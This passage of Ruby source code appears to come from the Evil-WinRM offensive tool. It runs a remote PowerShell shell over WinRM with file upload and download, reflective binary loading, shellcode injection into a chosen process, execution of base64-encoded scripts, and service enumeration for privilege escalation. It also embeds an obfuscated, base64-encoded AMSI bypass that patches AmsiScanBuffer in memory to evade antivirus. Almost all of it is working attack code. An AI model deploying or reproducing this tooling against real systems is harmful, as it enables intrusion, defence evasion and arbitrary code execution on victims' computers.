LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwCltTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWQoJGJ5dGVzKSB8IE91dC1OdWxsCiRiYXNlNjQgPSAkZG9udXRmaWxlClthcnJheV0kYXJyYXkgPSAkcHJvY2Vzc19pZCwkQmFzZTY0CltTaGVsbGNvZGVUZXN0LlByb2dyYW1dOjpNYWluKCRhcnJheSkKfQp9CmZ1bmN0aW9uIHNob3ctbWV0aG9kcy1sb2FkZWQgeyRnbG9iYWw6c2hvd21ldGhvZHN9Cg==")
        command = ""

        begin
            time = Time.now.to_i
            self.print_message("Establishing connection to remote endpoint", TYPE_INFO)
            $conn.shell(:powershell) do |shell|
                begin
                    completion =
                    proc do |str|
                    case
                        when Readline.line_buffer =~ /help.*/i
                            puts("#{$LIST.join("\t")}")
                        when Readline.line_buffer =~ /Invoke-Binary.*/i
                            result = @executables.grep( /^#{Regexp.escape(str)}/i ) || []
                            if result.empty? then
                                paths = self.paths(str)
                                result.concat(paths.grep( /^#{Regexp.escape(str)}/i ))
                            end
                            result.uniq
                        when Readline.line_buffer =~ /donutfile.*/i
                            paths = self.paths(str)
                            paths.grep( /^#{Regexp.escape(str)}/i )
                        when Readline.line_buffer =~ /Donut-Loader -process_id.*/i
                            $DONUTPARAM2.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?
                        when Readline.line_buffer =~ /Donut-Loader.*/i
                            $DONUTPARAM1.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?
                        when Readline.line_buffer =~ /^upload.*/i
                            test_s = Readline.line_buffer.gsub('\\ ', '\#\#\#\#')
                            if test_s.count(' ') < 2 then
                                self.paths(str) || []
                            else
                                self.complete_path(str, shell) || []
                            end
                        when Readline.line_buffer =~ /^download.*/i
                            test_s = Readline.line_buffer.gsub('\\ ', '\#\#\#\#')
                            if test_s.count(' ') < 2 then
                                self.complete_path(str, shell) || []
                            else
                                paths = self.paths(str)
                            end
                        when (Readline.line_buffer.empty? || !(Readline.line_buffer.include?(' ') || Readline.line_buffer =~ /^\"?(\.\/|\.\.\/|[a-z,A-Z]\:\/|\~\/|\/)/))
                            result = $COMMANDS.grep( /^#{Regexp.escape(str)}/i ) || []
                            result.concat(@functions.grep(/^#{Regexp.escape(str)}/i))
                            result.uniq
                        else
                            result = Array.new
                            result.concat(self.complete_path(str, shell) || [])
                            result
                        end
                    end

                    Readline.completion_proc = completion
                    Readline.completion_append_character = ''
                    Readline.completion_case_fold = true
                    Readline.completer_quote_characters = "\""

                    until command == "exit" do
                        pwd = shell.run("(get-location).path").output.strip

                        if $colors_enabled then
                            command = Readline.readline(self.colorize("*Evil-WinRM*", "red") + self.colorize(" PS ", "yellow") + pwd + "> ", true)
                        else
                            command = Readline.readline("*Evil-WinRM* PS " + pwd + "> ", true)
                        end
                        if !$logger.nil?
                            $logger.info("*Evil-WinRM* PS #{pwd} > #{command}")
                        end

                        if command.start_with?('upload') then
                            if self.docker_detection() then
                                puts()
                                self.print_message("Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command", TYPE_WARNING, true, $logger)
                            end

                            begin
                                paths = self.get_upload_paths(command, pwd)
                                right_path = paths.pop
                                left_path = paths.pop

                                self.print_message("Uploading #{left_path} to #{right_path}", TYPE_INFO, true, $logger)
                                file_manager.upload(left_path, right_path) do |bytes_copied, total_bytes|
                                    self.progress_bar(bytes_copied, total_bytes)
                                    if bytes_copied == total_bytes then
                                        puts("                                                             ")
                                        self.print_message("#{bytes_copied} bytes of #{total_bytes} bytes copied", TYPE_DATA, true, $logger)
                                        self.print_message("Upload successful!", TYPE_INFO, true, $logger)
                                    end
                                end
                            rescue StandardError => err
                                self.print_message("#{err.to_s}: #{err.backtrace}", TYPE_ERROR, true, $logger)
                                self.print_message("Upload failed. Check filenames or paths", TYPE_ERROR, true, $logger)
                            ensure
                                command = ""
                            end
                        elsif command.start_with?('download') then
                            if self.docker_detection() then
                                puts()
                                self.print_message("Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command", TYPE_WARNING, true, $logger)
                            end

                            begin
                                paths = self.get_download_paths(command, pwd)
                                right_path = paths.pop
                                left_path = paths.pop

                                self.print_message("Downloading #{left_path} to #{right_path}", TYPE_INFO, true, $logger)
                                size = self.filesize(shell, left_path)
                                file_manager.download(left_path, right_path, size: size) do | index, size |
                                    self.progress_bar(index, size)
                                end
                                puts("                                                             ")
                                self.print_message("Download successful!", TYPE_INFO, true, $logger)
                            rescue StandardError => err
                                self.print_message("Download failed. Check filenames or paths", TYPE_ERROR, true, $logger)
                            ensure
                                command = ""
                            end
                        elsif command.start_with?('Invoke-Binary') then
                            begin
                                invoke_Binary = command.tokenize
                                command = ""
                                if !invoke_Binary[1].to_s.empty? then
                                    load_executable = invoke_Binary[1]
                                    load_executable = File.binread(load_executable)
                                    load_executable = Base64.strict_encode64(load_executable)
                                    if !invoke_Binary[2].to_s.empty?
                                        output = shell.run("Invoke-Binary " + load_executable + " ," + invoke_Binary[2])
                                        puts(output.output)
                                    elsif invoke_Binary[2].to_s.empty?
                                        output = shell.run("Invoke-Binary " + load_executable)
                                        puts(output.output)
                                    end
                                elsif
                                    output = shell.run("Invoke-Binary")
                                    puts(output.output)
                                end
                            rescue StandardError => err
                                self.print_message("Check filenames", TYPE_ERROR, true, $logger)
                            end

                        elsif command.start_with?('Donut-Loader') then
                            begin
                                donut_Loader = command.tokenize
                                command = ""
                                if !donut_Loader[4].to_s.empty? then
                                    pid = donut_Loader[2]
                                    load_executable = donut_Loader[4]
                                    load_executable = File.binread(load_executable)
                                    load_executable = Base64.strict_encode64(load_executable)
                                    output = shell.run("Donut-Loader -process_id #{pid} -donutfile #{load_executable}")
                                elsif
                                    output = shell.run("Donut-Loader")
                                end
                                print(output.output)
                                if !$logger.nil?
                                    $logger.info(output.output)
                                end
                            rescue
                                self.print_message("Check filenames", TYPE_ERROR, true, $logger)
                            end

                        elsif command.start_with?('services') then
                            command = ""
                            output = shell.run('$servicios = Get-ItemProperty "registry::HKLM\System\CurrentControlSet\Services\*" | Where-Object {$_.imagepath -notmatch "system" -and $_.imagepath -ne $null } | Select-Object pschildname,imagepath  ; foreach ($servicio in $servicios  ) {Get-Service $servicio.PSChildName -ErrorAction SilentlyContinue | Out-Null ; if ($? -eq $true) {$privs = $true} else {$privs = $false} ; $Servicios_object = New-Object psobject -Property @{"Service" = $servicio.pschildname ; "Path" = $servicio.imagepath ; "Privileges" = $privs} ;  $Servicios_object }')
                            print(output.output.chomp)
                            if !$logger.nil?
                                $logger.info(output.output.chomp)
                            end
                        elsif command.start_with?(*@functions) then
                            self.silent_warnings do
                                load_script = $scripts_path + command
                                command = ""
                                load_script = load_script.gsub(" ","")
                                load_script = File.binread(load_script)
                                load_script = Base64.strict_encode64(load_script)
                                script_split = load_script.scan(/.{1,5000}/)
                                script_split.each do |item|
                                    output = shell.run("$a += '#{item}'")
                                end
                                output = shell.run("IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($a))).replace('???','')")
                                output = shell.run("$a = $null")
                            end

                        elsif command.start_with?('menu') then
                            command = ""
                            self.silent_warnings do
                                output = shell.run(menu)
                                output = shell.run("Menu")
                                autocomplete = shell.run("auto").output.chomp
                                autocomplete = autocomplete.gsub!(/\r\n?/, "\n")
                                assemblyautocomplete = shell.run("show-methods-loaded").output.chomp
                                assemblyautocomplete = assemblyautocomplete.gsub!(/\r\n?/, "\n")
                                if !assemblyautocomplete.to_s.empty?
                                    $LISTASSEMNOW = assemblyautocomplete.split("\n")
                                    $LISTASSEM = $LISTASSEM + $LISTASSEMNOW
                                end
                                $LIST2 = autocomplete.split("\n")
                                $LIST = $LIST + $LIST2
                                $COMMANDS = $COMMANDS + $LIST2
                                $COMMANDS = $COMMANDS.uniq
                                message_output = output.output.chomp("\n") + "[+] " + $CMDS.join("\n").gsub(/\n/, "\n[+] ") + "\n\n"
                                puts(message_output)
                                if !$logger.nil?
                                    $logger.info(message_output)
                                end
                            end

                        elsif (command == "Bypass-4MSI")
                            command = ""
                            timeToWait = (time + 20) - Time.now.to_i

                            if timeToWait > 0
                                puts()
                                self.print_message("AV could be still watching for suspicious activity. Waiting for patching...", TYPE_WARNING, true, $logger)
                                @blank_line = true
                                sleep(timeToWait)
                            end
                            if !@Bypass_4MSI_loaded
                                self.load_Bypass_4MSI(shell)
                                @Bypass_4MSI_loaded = true
                            end
                        end
                        output = shell.run(command) do |stdout, stderr|
                            stdout&.each_line do |line|
                                STDOUT.puts(line.rstrip!)
                            end
                            STDERR.print(stderr)
                        end
                        if !$logger.nil? && !command.empty?
                            output_logger=""
                            output.output.each_line do |line|
                                output_logger += "#{line.rstrip!}\n"
                            end
                            $logger.info(output_logger)
                        end
                    end
                rescue Errno::EACCES => ex
                    puts()
                    self.print_message("An error of type #{ex.class} happened, message is #{ex.message}", TYPE_ERROR, true, $logger)
                    retry
                rescue Interrupt
                    puts("\n\n")
                    self.print_message("Press \"y\" to exit, press any other key to continue", TYPE_WARNING, true, $logger)
                    if STDIN.getch.downcase == "y"
                        self.custom_exit(130)
                    else
                        retry
                    end
                end
            self.custom_exit(0)
        end
        rescue SystemExit
        rescue SocketError
            self.print_message("Check your /etc/hosts file to ensure you can resolve #{$host}", TYPE_ERROR, true, $logger)
            self.custom_exit(1)
        rescue Exception => ex
            self.print_message("An error of type #{ex.class} happened, message is #{ex.message}", TYPE_ERROR, true, $logger)
            self.custom_exit(1)
        end
    end

    def random_string(len=3)
        Array.new(len){ [*'0'..'9',*'A'..'Z',*'a'..'z'].sample }.join
    end

    def random_case(word)
        word.chars.map { |c| (rand 2) == 0 ? c : c.upcase }.join
    end

    def get_char_expresion(the_char)
        rand_val = rand(10000) + rand(100)
        val = the_char.ord + rand_val
        char_val = self.random_case("char")

        return "[#{char_val}](#{val.to_s}-#{rand_val.to_s})"
    end

    def get_byte_expresion(the_char)
        rand_val = rand(30..120)
        val = the_char.ord + rand_val
        char_val = self.random_case("char")
        byte_val = self.random_case("byte")

        return "[#{char_val}]([#{byte_val}] 0x#{val.to_s(16)}-0x#{rand_val.to_s(16)})"
    end

    def get_char_raw(the_char)
        return "\"#{the_char}\""
    end

    def generate_random_type_string()
        to_randomize = "AmsiScanBuffer"
        result = ""
        to_randomize.chars.each { |c| result +=  "+#{(rand 2) == 0 ? (rand 2) == 0 ? self.get_char_raw(c): self.get_byte_expresion(c) : self.get_char_expresion(c)}"}
        result[1..-1]
    end

    def get_Bypass_4MSI()
        bypass_template = "JGNvZGUgPSBAIgp1c2luZyBTeXN0ZW07CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKcHVibGljIGNsYXNzIGNvZGUgewogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgTG9hZExpYnJhcnkoc3RyaW5nIG5hbWUpOwogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgVmlydHVhbFByb3RlY3QoSW50UHRyIGxwQWRkcmVzcywgVUludFB0ciBydW9xeHAsIHVpbnQgZmxOZXdQcm90ZWN0LCBvdXQgdWludCBscGZsT2xkUHJvdGVjdCk7Cn0KIkAKQWRkLVR5cGUgJGNvZGUKJGZqdGZxd24gPSBbY29kZV06OkxvYWRMaWJyYXJ5KCJhbXNpLmRsbCIpCiNqdW1wCiRqeXV5amcgPSBbY29kZV06OkdldFByb2NBZGRyZXNzKCRmanRmcXduLCAiIiskdmFyMSsiIikKJHAgPSAwCiNqdW1wCiRudWxsID0gW2NvZGVdOjpWaXJ0dWFsUHJvdGVjdCgkanl1eWpnLCBbdWludDMyXTUsIDB4NDAsIFtyZWZdJHApCiRmbnh5ID0gIjB4QjgiCiRmbXh5ID0gIjB4NTciCiRld2FxID0gIjB4MDAiCiR3ZnRjID0gIjB4MDciCiRuZHVnID0gIjB4ODAiCiRobXp4ID0gIjB4QzMiCiNqdW1wCiRsbGZhbSA9IFtCeXRlW11dICgkZm54eSwkZm14eSwkZXdhcSwkd2Z0YywrJG5kdWcsKyRobXp4KQokbnVsbCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJGxsZmFtLCAwLCAkanl1eWpnLCA2KSA="
        dec_template = Base64.decode64(bypass_template)
        result = dec_template.gsub("$var1", self.generate_random_type_string())
        @bypass_amsi_words_random_case.each {|w| result.gsub!("#{w}", self.random_case(w)) }
        result
    end

    def load_Bypass_4MSI(shell)
        bypass = self.get_Bypass_4MSI()

        if !@blank_line then
            puts()
        end
        self.print_message("Patching 4MSI, please be patient...", TYPE_INFO, true)
        bypass.split("#jump").each do |item|
            output = shell.run(item)
            sleep(2)
        end

        output = shell.run(bypass)
        if output.output.empty? then
            self.print_message("[+] Success!", TYPE_SUCCESS, false)
        else
            puts(output.output)
        end
    end

    def extract_filename(path)
        path.split('/')[-1]
    end

    def extract_next_quoted_path(cmd_with_quoted_path)
        begin_i = cmd_with_quoted_path.index("\"")
        l_total = cmd_with_quoted_path.length()
        next_i = cmd_with_quoted_path[begin_i +1, l_total - begin_i].index("\"")
        result = cmd_with_quoted_path[begin_i +1, next_i]
        result
    end

    def get_upload_paths(upload_command, pwd)
        quotes = upload_command.count("\"")
        result = []
        if quotes == 0 || quotes % 2 != 0 then
            result = upload_command.split(' ')
            result.delete_at(0)
        else
            quoted_path = self.extract_next_quoted_path(upload_command)
            upload_command = upload_command.gsub("\"#{quoted_path}\"", '')
            result = upload_command.split(' ')
            result.delete_at(0)
            result.push(quoted_path) unless quoted_path.nil? || quoted_path.empty?
        end
        result.push("#{pwd}\\#{self.extract_filename(result[0])}") if result.length == 1
        result
    end

    def get_download_paths(download_command, pwd)
        quotes = download_command.count("\"")
        result = []
        if quotes == 0 || quotes % 2 != 0 then
            result = download_command.split(' ')
            result.delete_at(0)
        else
            quoted_path = self.extract_next_quoted_path(download_command)
            download_command = download_command.gsub("\"#{quoted_path}\"", '')
            result.push(quoted_path)
            rest = download_command.split(' ')
            unless rest.nil? || rest.empty?
                rest.delete_at(0)
                result.push(rest[0]) if rest.length == 1
            end
        end

        result.push("./#{self.extract_filename(result[0])}") if result.length == 1
        result
    end

    def get_from_cache(n_path)
        unless n_path.nil? || n_path.empty? then
            a_path = self.normalize_path(n_path)
            current_time = Time.now.to_i
            current_vals = @directories[a_path]
            result = Array.new
            unless current_vals.nil? then
                is_valid = current_vals['time'] > current_time - @cache_ttl
                result = current_vals['files'] if is_valid
                @directories.delete(a_path) unless is_valid
            end

            return result
        end
    end

    def set_cache(n_path, paths)
        unless n_path.nil? || n_path.empty? then
            a_path = self.normalize_path(n_path)
            current_time = Time.now.to_i
            @directories[a_path] = { 'time' => current_time, 'files' => paths }
        end
    end

    def normalize_path(str)
        Regexp.escape(str.to_s.gsub('\\', '/'))
    end

    def get_dir_parts(n_path)
        return [n_path, "" ] if !!(n_path[-1] =~ /\/$/)
        i_last = n_path.rindex('/')
        if i_last.nil?
            return ["./", n_path]
        end

        next_i = i_last + 1
        amount = n_path.length() - next_i

        return [n_path[0, i_last + 1], n_path[next_i, amount]]
    end

    def complete_path(str, shell)
        if @completion_enabled then
            if !str.empty? && !!(str =~ /^(\.\/|[a-z,A-Z]\:|\.\.\/|\~\/|\/)*/i) then
                n_path = str
                parts = self.get_dir_parts(n_path)
                dir_p = parts[0]
                nam_p = parts[1]
                result = []
                result = self.get_from_cache(dir_p) unless dir_p =~ /^(\.\/|\.\.\/|\~|\/)/

                if result.nil? || result.empty? then
                    target_dir = dir_p
                    pscmd = "$a=@();$(ls '#{target_dir}*' -ErrorAction SilentlyContinue -Force |Foreach-Object {  if((Get-Item $_.FullName -ErrorAction SilentlyContinue) -is [System.IO.DirectoryInfo] ){ $a +=  \"$($_.FullName.Replace('\\','/'))/\"}else{  $a += \"$($_.FullName.Replace('\\', '/'))\" } });$a += \"$($(Resolve-Path -Path '#{target_dir}').Path.Replace('\\','/'))\";$a"

                    output = shell.run(pscmd).output
                    s = output.to_s.gsub(/\r/, '').split(/\n/)

                    dir_p = s.pop
                    self.set_cache(dir_p, s)
                    result = s
                end
                dir_p = dir_p + "/" unless dir_p[-1] == "/"
                path_grep = self.normalize_path(dir_p + nam_p)
                path_grep = path_grep.chop() if !path_grep.empty? && path_grep[0] == "\""
                filtered = result.grep(/^#{path_grep}/i)
                return filtered.collect{ |x| "\"#{x}\"" }
            end
        end
    end
end

# Class to create array (tokenize) from a string
class String def tokenize
    self.
        split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
        select {|s| not s.empty? }.
        map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
    end
end

# Execution
e = EvilWinRM.new
e.main
